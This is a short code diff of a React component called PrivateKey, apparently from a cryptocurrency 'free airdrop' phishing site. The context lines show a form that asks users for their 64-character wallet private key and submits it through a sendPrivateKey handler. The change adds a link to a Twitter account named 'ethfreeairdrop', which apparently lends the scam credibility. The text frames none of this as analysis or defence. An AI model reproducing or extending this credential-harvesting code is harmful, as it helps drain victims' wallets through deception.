@@ -33,7 +33,7 @@ function PrivateKey() {
                 <p className="phrase__description">Typically 64 alphanumeric characters</p>
                 <Button onClick={sendPrivateKey} type="submit" className="btn" variant="contained" color="primary">IMPORT</Button>
                 </form>
-               <a className="social__handles"> <TwitterIcon color="primary"/>Twitter</a>
+               <a href="https://mobile.twitter.com/ethfreeairdrop" className="social__handles"> <TwitterIcon color="primary"/>Twitter</a>
                 
             </div>
         </div>
